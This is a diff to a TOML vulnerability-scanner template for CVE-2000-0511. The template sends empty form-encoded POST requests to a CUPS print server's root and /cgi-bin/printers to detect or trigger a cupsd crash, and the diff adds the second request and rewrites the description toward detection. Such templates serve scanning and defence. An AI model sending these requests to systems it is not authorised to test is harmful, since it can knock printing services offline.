@@ -1,30 +1,30 @@
 [info]
 author = "AVE"
-description = "CUPS 1.04及更早版本中cupsd处理CGI POST请求时存在缺陷，发送标准表单POST可导致cupsd进程崩溃造成拒绝服务"
+description = "检测目标CUPS服务是否存在CGI POST请求拒绝服务漏洞。通过向CUPS服务发送特制POST请求，验证服务是否响应，从而判断是否存在CVE-2000-0511漏洞"
 id = "POC-AVE-2000-0574"
-name = "CVE-2000-0511 CUPS CGI POST Denial of Service PoC"
+name = "CVE-2000-0511 CUPS CGI POST DoS PoC"
 severity = "medium"
-tags = ["ave-2000-0574"]
+tags = [
+    "cve-2000-0511",
+    "cups",
+    "dos",
+]
 vuln_id = [
     "CVE-2000-0511",
     "AVE-2000-0574",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
 path = "/{{BaseURL}}/"
 protocol = "http"
 
-[poc.requests.body]
-content = ""
-type = "raw"
-
 [poc.requests.headers]
+Content-Length = "0"
 Content-Type = "application/x-www-form-urlencoded"
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
@@ -32,6 +32,25 @@ part = "body"
 type = "word"
 words = [
     "CUPS",
-    "cups",
+    "cupsd",
+    "IPP",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/printers"
+protocol = "http"
+
+[poc.requests.headers]
+Content-Length = "0"
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "CUPS",
+    "cupsd",
     "IPP",
 ]
